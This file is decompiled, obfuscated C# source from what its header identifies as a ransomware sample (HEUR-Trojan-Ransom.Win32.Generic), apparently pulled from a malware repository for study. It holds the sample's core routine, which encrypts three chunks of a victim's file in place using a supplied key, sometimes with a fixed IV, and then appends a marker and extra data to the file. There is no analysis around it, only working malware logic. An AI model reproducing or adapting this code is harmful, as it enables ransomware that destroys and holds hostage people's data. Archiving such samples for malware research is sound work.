// Decompiled with JetBrains decompiler
// Type: PMpBbYpvEb.fzmxMDmmyWAvX
// Assembly: sloc, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8380720F-5D35-42C0-94D8-715B8457E8C4
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.05\HEUR-Trojan-Ransom.Win32.Generic-39a044db72d3ca39122af249cd60660d7e200366af958c762910605eaed020cb.exe

using lKwIARJqZgRWh;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace PMpBbYpvEb
{
  internal sealed class fzmxMDmmyWAvX
  {
    [NonSerialized]
    internal static GetString \u007F;

    public static int QEjibmvnXp([In] long obj0) => (int) obj0;

    public static bool FptNnshurU(
      string xDDtBuNewOTmZ,
      string fZvDvlixEeV,
      string wNfyEdXFBWaDd,
      byte[] BKdBNrEdMebz = null,
      byte[] xLhAGGhUsfDgXY = null)
    {
      try
      {
        using (FileStream fileStream = new FileStream(xDDtBuNewOTmZ, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
        {
          int num1 = fzmxMDmmyWAvX.QEjibmvnXp(fileStream.Length) / 3;
          if (num1 < 0)
            num1 *= -1;
          int num2;
          try
          {
            num2 = Convert.ToInt32(fZvDvlixEeV) * Convert.ToInt32(fileStream.Length) / 100 / 2;
            if (num2 < 0)
              num2 *= -1;
          }
          catch
          {
            num2 = 107374182;
          }
          if (num1 <= num2 - Convert.ToInt32(fZvDvlixEeV) * 1024 * 1024)
            num2 = (num1 - Convert.ToInt32(fZvDvlixEeV) * 1024 * 1024) / 10;
          int num3 = 32;
          int iLhdqYDxvEX = (int) Math.Round((double) num2 / (double) num3, MidpointRounding.AwayFromZero) * num3;
          for (int index = 0; index < 3; ++index)
          {
            byte[] numArray = fzmxMDmmyWAvX.gKfWHYwUHOAVasx(xDDtBuNewOTmZ, fileStream, iLhdqYDxvEX, num1 * index);
            byte[] LBXJNQavQLCiyjC;
            if (!PhxOPeBqRsG.XCsezoZWotlJ)
              LBXJNQavQLCiyjC = ILCPTbEyPImvS.oTLflFQwfxprG(numArray, Convert.FromBase64String(wNfyEdXFBWaDd), new byte[8]
              {
                (byte) 1,
                (byte) 2,
                (byte) 3,
                (byte) 4,
                (byte) 5,
                (byte) 6,
                (byte) 7,
                (byte) 8
              });
            else
              LBXJNQavQLCiyjC = xdhcRNHRhIrdsES.rIPxguvEmEeCvU(numArray, Convert.FromBase64String(wNfyEdXFBWaDd), xLhAGGhUsfDgXY);
            fzmxMDmmyWAvX.FZyKWFoOOgjaP(xDDtBuNewOTmZ, fileStream, LBXJNQavQLCiyjC, num1 * index);
          }
        }
        byte[] buffer = PhxOPeBqRsG.ldSVapxVzrqD ? (PhxOPeBqRsG.WcDXYQEnYXB ? Encoding.ASCII.GetBytes(PhxOPeBqRsG.jPRGqhYdKzNWs(fzmxMDmmyWAvX.\u007F(107409335)) + PhxOPeBqRsG.jPRGqhYdKzNWs(fzmxMDmmyWAvX.\u007F(107409755)) + Convert.ToString(fZvDvlixEeV) + PhxOPeBqRsG.jPRGqhYdKzNWs(fzmxMDmmyWAvX.\u007F(107409755))) : Encoding.ASCII.GetBytes(PhxOPeBqRsG.jPRGqhYdKzNWs(fzmxMDmmyWAvX.\u007F(107409393)) + PhxOPeBqRsG.jPRGqhYdKzNWs(fzmxMDmmyWAvX.\u007F(107409755)) + Convert.ToString(fZvDvlixEeV) + PhxOPeBqRsG.jPRGqhYdKzNWs(fzmxMDmmyWAvX.\u007F(107409755)))) : (PhxOPeBqRsG.WcDXYQEnYXB ? Encoding.ASCII.GetBytes(PhxOPeBqRsG.jPRGqhYdKzNWs(fzmxMDmmyWAvX.\u007F(107409380)) + PhxOPeBqRsG.jPRGqhYdKzNWs(fzmxMDmmyWAvX.\u007F(107409809)) + Convert.ToString(fZvDvlixEeV) + PhxOPeBqRsG.jPRGqhYdKzNWs(fzmxMDmmyWAvX.\u007F(107409809))) : Encoding.ASCII.GetBytes(PhxOPeBqRsG.jPRGqhYdKzNWs(fzmxMDmmyWAvX.\u007F(107409393)) + PhxOPeBqRsG.jPRGqhYdKzNWs(fzmxMDmmyWAvX.\u007F(107409809)) + Convert.ToString(fZvDvlixEeV) + PhxOPeBqRsG.jPRGqhYdKzNWs(fzmxMDmmyWAvX.\u007F(107409809))));
        if (!PhxOPeBqRsG.ldSVapxVzrqD)
        {
          using (FileStream fileStream = new FileStream(xDDtBuNewOTmZ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
            fileStream.Write(buffer, 0, buffer.Length);
        }
        else
        {
          using (FileStream fileStream = new FileStream(xDDtBuNewOTmZ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
          {
            fileStream.Write(BKdBNrEdMebz, 0, BKdBNrEdMebz.Length);
            fileStream.Write(buffer, 0, buffer.Length);
          }
        }
      }
      catch (Exception ex1)
      {
        if (PhxOPeBqRsG.iJiZVjbYIelgdjs)
        {
          try
          {
            File.AppendAllText(PhxOPeBqRsG.CJWDXdtMlfSYp, fzmxMDmmyWAvX.\u007F(107387388) + xDDtBuNewOTmZ + fzmxMDmmyWAvX.\u007F(107409354) + ex1.Message + fzmxMDmmyWAvX.\u007F(107395772));
          }
          catch (Exception ex2)
          {
          }
        }
        ++PhxOPeBqRsG.jlTbuRFtzeuGOi;
        return false;
      }
      ++PhxOPeBqRsG.AOxElPxfgdJ;
      return true;
    }

    public static byte[] gKfWHYwUHOAVasx(
      string JFOduAzhydcH,
      FileStream NcWtHVYylUmgt,
      int iLhdqYDxvEX,
      int epoeflxjEg = 0)
    {
      byte[] buffer = new byte[iLhdqYDxvEX];
      NcWtHVYylUmgt.Position = (long) epoeflxjEg;
      NcWtHVYylUmgt.Read(buffer, 0, iLhdqYDxvEX);
      return buffer;
    }

    public static void FZyKWFoOOgjaP(
      string uqYbZPvMGCuWgu,
      FileStream DPjHmBQJqDUHHn,
      byte[] LBXJNQavQLCiyjC,
      int dcWPOBDuyHCm = 0)
    {
      DPjHmBQJqDUHHn.Position = (long) dcWPOBDuyHCm;
      DPjHmBQJqDUHHn.Write(LBXJNQavQLCiyjC, 0, LBXJNQavQLCiyjC.Length);
    }

    static fzmxMDmmyWAvX() => Strings.CreateGetStringDelegate(typeof (fzmxMDmmyWAvX));
  }
}
